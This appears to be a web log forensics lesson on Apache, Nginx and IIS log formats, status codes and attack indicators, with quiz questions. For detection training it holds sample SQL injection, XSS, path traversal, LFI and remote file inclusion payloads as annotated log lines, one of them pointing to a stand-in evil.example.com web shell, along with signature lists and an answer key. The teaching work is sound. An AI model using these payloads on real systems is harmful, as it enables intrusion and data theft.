1. Log Formats — Field by Field

Different web servers record requests in different formats, but the core data elements are remarkably similar. A forensic examiner must be comfortable with all three major formats and know where each server stores its logs.

1.1 Apache Combined Log Format (CLF)

The Apache Combined Log Format is the most common format encountered in forensic casework. It extends the Common Log Format by appending the Referer and User-Agent fields.

💡 Access Logs vs. Error Logs

Access logs (access.log) record every HTTP request, whether successful or not. Error logs (error.log) record server-side issues, misconfigurations, and application errors. Forensic examiners should always collect both—error logs frequently contain stack traces and path disclosures that illuminate what happened behind the scenes during an attack.

Click or tap any highlighted field below to see its definition and forensic significance:

192.168.44.27  -  jdoe  [15/Apr/2026:09:32:17 -0700]  "GET /app/dashboard?id=42 HTTP/1.1"  200  3842  "https://intranet.example.com/login"  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
Client IP Address (Remote Host)
The IP address of the client that made the request. In forensic analysis this is the primary identifier for attributing requests to a source. Note: this may be a proxy or NAT address—always cross-reference with firewall and DHCP logs.
Ident (RFC 1413)
Identity of the client from the identd daemon. Almost always a hyphen (-) because the protocol is rarely enabled. Forensically insignificant in modern environments.
Authenticated User
The username if HTTP authentication was used; otherwise a hyphen. Critically important: if this field is populated during an attack, it may indicate compromised credentials or a successful brute-force login.
Timestamp
Date, time, and UTC offset of the request. The examiner must verify the server's timezone configuration and whether NTP synchronization was active. Timestamps are the backbone of forensic timelines.
Request Line
Contains the HTTP method (GET, POST, etc.), the URI path with query string, and the HTTP version. This is the primary field for attack detection—SQL injection payloads, directory traversal sequences, and XSS vectors appear here.
HTTP Status Code
The server's response code (e.g., 200 = OK, 404 = Not Found, 500 = Internal Server Error). Patterns of status codes reveal attack phases: bursts of 404s indicate scanning, 401/403 sequences indicate brute-forcing, and a sudden 200 after many failures may indicate a breach.
Response Size (Bytes)
The number of bytes in the response body (excluding headers). Anomalous sizes can indicate data exfiltration (unusually large responses) or error conditions (unusually small responses where content was expected).
Referer Header
The URL the client claims to have come from. Useful for tracing navigation paths. Attackers sometimes forge this field, and it can contain attack payloads in Referer-based injection attacks. Note the historical misspelling ("Referer" not "Referrer").
User-Agent String
Identifies the client software. Forensically valuable for identifying automated tools (e.g., Nikto, sqlmap, DirBuster). Legitimate browsers produce long, complex UA strings; scanners often have distinctive short signatures.

The Apache Combined Log Format string in the server configuration is:

# LogFormat directive in httpd.conf / apache2.conf
LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined

1.2 Nginx Combined Log Format

By default, Nginx uses a format nearly identical to Apache's Combined format. The field order and content are the same; only the configuration syntax differs:

# nginx.conf log_format directive
log_format combined '$remote_addr - $remote_user [$time_local] '
                    '"$request" $status $body_bytes_sent '
                    '"$http_referer" "$http_user_agent"';

Forensically, you can apply the same field-by-field analysis to Nginx logs. Key differences to note:

  • Default access log path: /var/log/nginx/access.log
  • Default error log path: /var/log/nginx/error.log
  • Nginx error logs include a severity level (e.g., [error], [crit]) that is useful for filtering forensically significant events.
  • Some Nginx configurations add $request_time or $upstream_response_time, which can reveal performance impacts from attack payloads.

1.3 IIS W3C Extended Log Format

Microsoft Internet Information Services (IIS) uses the W3C Extended Log Format, which is space-delimited with a header block that defines the field order. This header makes the format self-documenting but also means the field order can vary between servers.

#Software: Microsoft Internet Information Services 10.0
#Version: 1.0
#Date: 2026-04-15 09:00:00
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-bytes time-taken
2026-04-15 09:32:17 10.0.0.5 GET /app/dashboard id=42 443 jdoe 192.168.44.27 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://intranet.example.com/login 200 0 3842 125

Key forensic differences from Apache/Nginx formats:

  • URI stem and query are separate fields (cs-uri-stem and cs-uri-query), making it easier to filter on query parameters but requiring you to mentally combine them.
  • sc-substatus provides Windows-specific error subcodes (e.g., 401.3 = ACL denied) that add forensic detail.
  • time-taken is recorded in milliseconds, useful for identifying slow queries caused by injection payloads.
  • Default log path: C:\inetpub\logs\LogFiles\W3SVC<SiteID>\
  • Spaces in values are encoded as + signs.
  • Always read the #Fields: header line first to determine column order.

🔍 Forensic Note — Log Format Identification

When you receive log files during an investigation, the first step is always to identify the format. Look for: (1) the #Fields: header (IIS W3C), (2) the bracket-enclosed timestamp with timezone offset (Apache/Nginx), or (3) configuration files that define custom formats. Never assume—custom formats are common, and misreading fields will corrupt your analysis.

2. HTTP Status Codes for Forensic Analysis

HTTP status codes are three-digit numbers returned by the server in response to each request. They fall into five classes. The table below focuses on codes with the highest forensic significance—the ones that most commonly appear during attacks or reveal attacker behavior.

HTTP Status Code Forensic Reference Card
CodeNameClassForensic Significance
200OK2xx SuccessRequest succeeded. After a series of failed attack attempts, a 200 may indicate the attacker found a valid path or payload. Check the response size for anomalies.
301Moved Permanently3xx RedirectPermanent redirect. Can indicate URL rewriting that may obscure the actual resource accessed. Check the redirect target.
302Found (Redirect)3xx RedirectTemporary redirect. Often seen after successful login (redirect to dashboard). A 302 following brute-force attempts may indicate credential compromise.
400Bad Request4xx Client ErrorMalformed request. Common when attack payloads break HTTP syntax. Clusters of 400s from one IP suggest automated attack tools.
401Unauthorized4xx Client ErrorAuthentication required/failed. Rapid sequences of 401s indicate brute-force or credential-stuffing attacks.
403Forbidden4xx Client ErrorAccess denied by server policy. May indicate the attacker is probing restricted directories or the WAF is blocking payloads.
404Not Found4xx Client ErrorResource does not exist. High volumes of 404s from a single IP are a hallmark of directory/file enumeration and scanning.
405Method Not Allowed4xx Client ErrorHTTP method not permitted. May appear when attackers try PUT, DELETE, or TRACE methods during reconnaissance.
408Request Timeout4xx Client ErrorClient took too long. Can indicate Slowloris or similar slow-rate denial-of-service attacks.
414URI Too Long4xx Client ErrorThe request URI exceeded the server's limit. Often triggered by excessively long injection payloads in the URL.
500Internal Server Error5xx Server ErrorHigh forensic value. Often caused by injection payloads that crash the application. A 500 following a request with SQL syntax in the URI is a strong indicator of SQL injection testing.
502Bad Gateway5xx Server ErrorUpstream server failure. May indicate that an attack payload crashed a backend application server.
503Service Unavailable5xx Server ErrorServer overloaded or in maintenance. Can result from successful denial-of-service attacks.

💡 Pattern, Not Individual Codes

A single 404 or 500 is routine. The forensic signal is in the pattern: dozens of 404s in rapid succession from one IP = scanning; a sequence of 500s with SQL keywords in the URI = injection testing; a burst of 401s followed by a 302 redirect = possible brute-force success. Always analyze status codes in context and over time.

3. Web Attack Indicators in Log Files

This section covers five major categories of web attacks as they appear in server logs. Each category includes a pattern description, key signatures to search for, and an annotated example log line. Expand each section to study the details.

What It Is

SQL Injection occurs when an attacker inserts SQL syntax into user-supplied input fields (query parameters, form fields, cookies, or headers) that are passed unsanitized to a database query. The goal may be data extraction, authentication bypass, data modification, or even command execution.

Log Signatures to Search For

  • UNION+SELECT or UNION%20SELECT — union-based injection to extract data from other tables
  • OR+1=1, OR+'1'='1, ' OR ''=' — boolean-based authentication bypass
  • SELECT, INSERT, UPDATE, DELETE, DROP — SQL keywords in URI or query string
  • SLEEP(, BENCHMARK(, WAITFOR+DELAY — time-based blind injection
  • -- or %23 (URL-encoded #) — SQL comment sequences used to truncate queries
  • CHAR(, CONCAT(, 0x — encoding/obfuscation of payloads
  • Requests that produce 500 Internal Server Error responses alongside these keywords

Annotated Example Log Line

10.0.0.99 - - [15/Apr/2026:10:14:33 -0700] "GET /products/detail?id=7'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 500 842 "-" "sqlmap/1.7.5#stable"

Analysis:

  • The id parameter contains a UNION SELECT payload targeting a users table.
  • The single quote (') before UNION closes the original query's string literal.
  • The double-dash (--) comments out the remainder of the original SQL query.
  • The 500 status code indicates the payload caused a server error—the application likely threw a database exception.
  • The User-Agent identifies sqlmap, a well-known automated SQL injection tool.
  • Response size of 842 bytes is small, suggesting an error page rather than successful data extraction.

⚠️ URL Encoding

Attackers frequently URL-encode payloads to evade simple pattern matching. For example, UNION SELECT may appear as %55NION%20%53ELECT or use double encoding (%2555NION). Always decode log entries before analysis. Many log analysis tools have built-in URL decode functions.

What It Is

Cross-Site Scripting (XSS) occurs when an attacker injects client-side scripts (usually JavaScript) into web pages viewed by other users. While XSS executes in the victim's browser (not on the server), the attack payloads are visible in server logs when delivered via URL parameters (Reflected XSS) or when the attacker tests payloads.

Log Signatures to Search For

  • <script> or URL-encoded equivalents (%3Cscript%3E)
  • javascript: protocol in parameter values
  • onerror=, onload=, onmouseover= — HTML event handler injection
  • alert(, prompt(, confirm( — common proof-of-concept functions
  • document.cookie, document.location — cookie theft and redirection payloads
  • <img+src=x+onerror= — image tag injection, a common WAF bypass technique

Annotated Example Log Line

10.0.0.99 - - [15/Apr/2026:10:16:05 -0700] "GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1" 200 4521 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

Analysis:

  • The q parameter contains a URL-encoded <script>alert(document.cookie)</script> payload.
  • The 200 status code means the server accepted and processed the request—if the application reflects this input without sanitization, the script will execute in the browser of anyone who views the page.
  • The response size (4521 bytes) is normal for a search results page, suggesting the payload was embedded in the response.
  • The User-Agent appears legitimate, which is common—XSS testing is often done manually through a regular browser.

🔍 Forensic Note — POST-Based XSS

Many XSS payloads are delivered via POST request bodies, which are not recorded in standard access logs. If you suspect XSS but see no payloads in access logs, check application-level logs, WAF logs, or packet captures. This is a significant limitation of access-log-only analysis.

What It Is

This family of attacks manipulates file path references in web application parameters to access files outside the intended directory. There are several related techniques:

  • Path Traversal (../) — Using dot-dot-slash sequences to navigate up the directory tree and access sensitive system files.
  • Local File Inclusion (LFI) — Exploiting a file-include mechanism (e.g., page=about.php) to include arbitrary local files, such as /etc/passwd or application configuration files.
  • Remote File Inclusion (RFI) — Exploiting the same mechanism to include a file from an attacker-controlled remote server (e.g., page=http://evil.com/shell.txt), often to execute a web shell.
  • Null Byte Injection (%00) — Appending a null byte to truncate a file extension that the application appends automatically. For example, if the application does include($input . ".php"), the attacker submits ../../../../etc/passwd%00 so the .php extension is ignored by the underlying C-based file functions.

Log Signatures to Search For

  • ../ or ..%2f or %2e%2e/ or ..%5c (backslash variant for Windows) — path traversal sequences
  • /etc/passwd, /etc/shadow, win.ini, boot.ini — common target files
  • /proc/self/environ — Linux process environment, used for LFI-to-RCE escalation
  • php://filter, php://input — PHP stream wrappers used in advanced LFI
  • http:// or https:// in parameter values — Remote File Inclusion indicator
  • %00 or \x00 — null byte injection
  • Parameters named page, file, include, path, template, doc — commonly targeted by inclusion attacks

Annotated Example: Path Traversal

10.0.0.99 - - [15/Apr/2026:10:18:42 -0700] "GET /app/download?file=../../../../etc/passwd HTTP/1.1" 200 1847 "-" "Mozilla/5.0"

Analysis: Four levels of ../ navigate from the application directory to the filesystem root. The 200 status and 1847-byte response (consistent with a typical /etc/passwd file) strongly suggest the traversal succeeded and the file contents were returned.

Annotated Example: LFI with Null Byte

10.0.0.99 - - [15/Apr/2026:10:19:11 -0700] "GET /cms/index.php?page=../../../etc/passwd%00 HTTP/1.1" 200 2103 "-" "Mozilla/5.0"

Analysis: The page parameter is being exploited for LFI. The %00 null byte at the end truncates whatever extension (e.g., .php) the application would normally append, allowing /etc/passwd to be included directly. This technique works on older PHP versions (before 5.3.4).

Annotated Example: Remote File Inclusion (RFI)

10.0.0.99 - - [15/Apr/2026:10:20:03 -0700] "GET /cms/index.php?page=http://evil.example.com/shell.txt HTTP/1.1" 200 58 "-" "Mozilla/5.0"

Analysis: The page parameter contains a full external URL. If the server's PHP configuration has allow_url_include enabled, the remote file will be fetched and executed as PHP code. The small response size (58 bytes) may indicate a web shell confirmation message. This is a critical severity finding—RFI typically leads to full server compromise.

⚠️ Encoding Evasion

Attackers use multiple encoding layers to evade detection: ..%252f (double URL encoding), ....// (nested traversal that survives single-pass stripping), and Unicode variants like %c0%af. Always normalize and decode URIs before pattern matching.

What It Is

Brute-force attacks involve repeated login attempts using different username/password combinations. Credential stuffing is a variant that uses username-password pairs leaked from other breaches. These attacks target login endpoints and produce distinctive log patterns.

Log Signatures to Search For

  • High volume of POST requests to login endpoints (/login, /wp-login.php, /admin, /auth)
  • Repeated 401 or 403 status codes from a single IP or small IP range
  • Consistent small response sizes (indicating identical error pages)
  • Rapid request rate — multiple requests per second to the same endpoint
  • A sudden 302 redirect or 200 OK with a different response size after many failures — indicates potential success
  • Rotating User-Agent strings from the same IP (tool trying to appear as different browsers)

Annotated Example: Brute-Force Sequence

# Repeated failed attempts — note identical status and response size
10.0.0.99 - - [15/Apr/2026:10:22:01 -0700] "POST /admin/login HTTP/1.1" 401 523 "-" "Hydra/9.4"
10.0.0.99 - - [15/Apr/2026:10:22:01 -0700] "POST /admin/login HTTP/1.1" 401 523 "-" "Hydra/9.4"
10.0.0.99 - - [15/Apr/2026:10:22:02 -0700] "POST /admin/login HTTP/1.1" 401 523 "-" "Hydra/9.4"
# Potential success — status changes to 302, response size differs
10.0.0.99 - - [15/Apr/2026:10:22:03 -0700] "POST /admin/login HTTP/1.1" 302 0 "-" "Hydra/9.4"

Analysis:

  • Multiple POST requests to /admin/login within the same second — far faster than human typing.
  • The Hydra/9.4 User-Agent identifies THC Hydra, a well-known password-cracking tool.
  • Three consecutive 401 responses with identical 523-byte bodies indicate failed login attempts.
  • The fourth request returns a 302 redirect with a 0-byte body (the redirect itself has no content). This status change strongly suggests the attacker found valid credentials.
  • The forensic examiner should immediately check what resources were accessed after this 302 to determine the scope of the compromise.

What It Is

Vulnerability scanners and web application assessment tools probe servers for known vulnerabilities, default files, backup files, and configuration weaknesses. They typically generate a large volume of requests in a short time and target well-known paths. Identifying scanner activity establishes the reconnaissance phase of an attack timeline.

Log Signatures to Search For

  • Known tool User-Agents: Nikto, DirBuster, Gobuster, wfuzz, Nessus, OpenVAS, Acunetix, ZAP, Burp, w3af
  • Rapid 404 sequences: Hundreds of requests to non-existent paths in seconds
  • Common probe paths: /robots.txt, /.env, /wp-admin/, /phpmyadmin/, /admin/, /.git/config, /backup.zip, /server-status, /web.config, /.htaccess
  • Sequential enumeration patterns: Alphabetical or wordlist-ordered path requests
  • HTTP method probing: OPTIONS, TRACE, PUT, DELETE requests
  • Absence of Referer: Scanners rarely set a Referer header

Annotated Example: Nikto Scan

10.0.0.99 - - [15/Apr/2026:10:10:01 -0700] "GET /robots.txt HTTP/1.1" 200 312 "-" "Mozilla/5.00 (Nikto/2.5.0)"
10.0.0.99 - - [15/Apr/2026:10:10:01 -0700] "GET /.env HTTP/1.1" 403 199 "-" "Mozilla/5.00 (Nikto/2.5.0)"
10.0.0.99 - - [15/Apr/2026:10:10:01 -0700] "GET /phpmyadmin/ HTTP/1.1" 404 196 "-" "Mozilla/5.00 (Nikto/2.5.0)"
10.0.0.99 - - [15/Apr/2026:10:10:02 -0700] "GET /.git/config HTTP/1.1" 200 247 "-" "Mozilla/5.00 (Nikto/2.5.0)"
10.0.0.99 - - [15/Apr/2026:10:10:02 -0700] "GET /server-status HTTP/1.1" 403 199 "-" "Mozilla/5.00 (Nikto/2.5.0)"

Analysis:

  • Five requests in under two seconds targeting well-known sensitive paths — clearly automated.
  • The Nikto/2.5.0 User-Agent explicitly identifies the scanner (not all attackers are this careless—some spoof the UA).
  • No Referer header on any request (all show "-").
  • Critical finding: /.git/config returned a 200 OK with 247 bytes. This means the Git repository configuration is exposed, potentially allowing the attacker to download the entire source code. This should be flagged as a high-priority finding.
  • The mix of 200, 403, and 404 responses is typical of scanning—the attacker is probing broadly and noting which resources exist.

💡 Spoofed User-Agents

Sophisticated attackers change their User-Agent to mimic legitimate browsers. When the UA looks normal, rely on behavioral indicators: request rate, sequential path patterns, lack of Referer, lack of associated asset requests (CSS, JS, images), and targeting of known sensitive paths.

4. Correlating Web Logs with Other Evidence

Web server logs are rarely analyzed in isolation. Effective forensic analysis requires correlating log data with other evidence sources to build a comprehensive picture of an incident.

4.1 IP Address Correlation

When you identify a suspicious IP address in web logs:

  • Firewall logs: Confirm the connection was established; check for other ports/services the same IP accessed.
  • DHCP logs: If the IP is internal, map it to a specific host and user via DHCP lease records.
  • DNS logs: Check if the IP performed DNS lookups that reveal additional reconnaissance targets.
  • IDS/IPS alerts: Correlate with any intrusion detection alerts triggered by the same source IP.
  • WHOIS / GeoIP: For external IPs, determine the registrant organization, ASN, and geographic location. Note that attackers frequently use VPNs, proxies, and compromised hosts.

4.2 Timestamp Correlation and Normalization

Timestamps are the glue that binds evidence from different sources into a coherent timeline. Critical steps:

  1. Verify timezone configuration on each log source. Apache logs include the UTC offset (e.g., -0700); IIS logs default to UTC.
  2. Normalize all timestamps to UTC before correlating across sources. A one-hour timezone mismatch can make events appear to happen in the wrong order.
  3. Check NTP synchronization — if a server's clock was drifting, timestamps may be offset by seconds or minutes. Look for NTP configuration and logs.
  4. Account for log rotation — ensure you have the complete set of log files covering the incident window.

4.3 Building a Forensic Timeline

A forensic timeline arranges events from all evidence sources in chronological order. For a web attack investigation, the timeline typically reveals these phases:

Typical Web Attack Timeline Phases
PhaseLog IndicatorsCorroborating Evidence
1. ReconnaissanceScanner UA strings, rapid 404s, probes for robots.txt, /.env, admin pathsIDS alerts for port scans, DNS lookups from attacker IP
2. Vulnerability TestingSQLi/XSS/traversal payloads in URIs, 400/500 status codesWAF blocks, application error logs with stack traces
3. ExploitationSuccessful payload (200 OK with anomalous response size), brute-force success (401→302 transition)Database query logs showing injected SQL, authentication system logs
4. Post-ExploitationAccess to admin panels, file upload requests, requests to newly created files (web shells)File system timeline showing new files, outbound connections from server
5. Persistence / ExfiltrationRepeated access to web shell, large response sizes (data download), unusual outbound requestsNetflow data showing outbound data transfers, cron/scheduled task modifications

🔍 Forensic Note — Documentation

As you build a timeline, document each entry with: (1) the normalized UTC timestamp, (2) the source log file and line number, (3) the event description, and (4) your interpretation of its significance. This documentation trail is essential for producing a defensible forensic report, which you will practice in the Week 14 capstone project.

1. An examiner reviewing Apache access logs sees 47 requests from IP 198.51.100.12 within 3 seconds. All target different paths such as /admin/, /.env, /wp-login.php, and /phpmyadmin/. Most return 404 status codes. What attack phase does this activity most likely represent?

✓ Correct! The high request rate, diverse target paths (known default/sensitive locations), and predominance of 404 responses are hallmarks of automated vulnerability scanning — the reconnaissance phase. The attacker is probing the server to discover what exists before launching targeted attacks.
✗ Not quite. The correct answer is (b) Automated reconnaissance / scanning. The key indicators are: (1) 47 requests in 3 seconds — far too fast for manual activity, (2) targeting many different well-known paths rather than a single endpoint, and (3) mostly 404 responses indicating the attacker is probing for resources that may or may not exist. SQLi and XSS target specific parameters; brute-force targets a single login endpoint repeatedly.

2. Consider this log entry:
10.0.0.77 - - [15/Apr/2026:11:45:22 -0700] "GET /page.php?file=../../../../etc/passwd%00 HTTP/1.1" 200 1847 "-" "Mozilla/5.0"
Which attack technique is being used, and what is the purpose of %00 at the end of the path?

✓ Correct! This is a Local File Inclusion (LFI) attack combined with null byte injection. The ../../../../ sequences traverse up to the root directory, and %00 (URL-encoded null byte) causes the underlying C string functions to terminate the string at that point, effectively removing any file extension (like .php) that the application would normally append. The 200 status and 1847-byte response size suggest the /etc/passwd file was successfully retrieved.
✗ Not quite. The correct answer is (c) Local File Inclusion with null byte injection. The file= parameter with ../ sequences is a classic LFI pattern targeting /etc/passwd. The %00 is a URL-encoded null byte (not a SQL comment or XSS technique). It truncates any file extension the application would append (e.g., if the code does include($input . ".php"), the null byte prevents .php from being appended). This technique works on older PHP versions (pre-5.3.4).

3. While analyzing a brute-force attack against /admin/login, an examiner observes 200 consecutive POST requests returning status 401 with response size 523 bytes, followed by a single POST returning status 302 with response size 0 bytes. What is the most likely interpretation of the 302 response?

✓ Correct! In a brute-force sequence, a change in the response pattern is the critical signal. The shift from 401 (authentication failed) to 302 (redirect) with a different response size strongly indicates that the attacker submitted valid credentials and was redirected to a post-login page (such as a dashboard). The 0-byte body is normal for a redirect response — the content is at the redirect target. The examiner should immediately investigate what the attacker accessed after this point.
✗ Not quite. The correct answer is (c) The attacker successfully authenticated and was redirected to a post-login page. The key forensic principle here is pattern deviation: 200 identical 401 responses followed by a single 302 represents a clear break in the pattern. A 302 (Found/Redirect) after a POST to a login endpoint is the standard behavior for a successful login — the application redirects the authenticated user to their dashboard. If the IP were blocked, you would expect a 403 (Forbidden) or connection reset, not a 302 redirect.
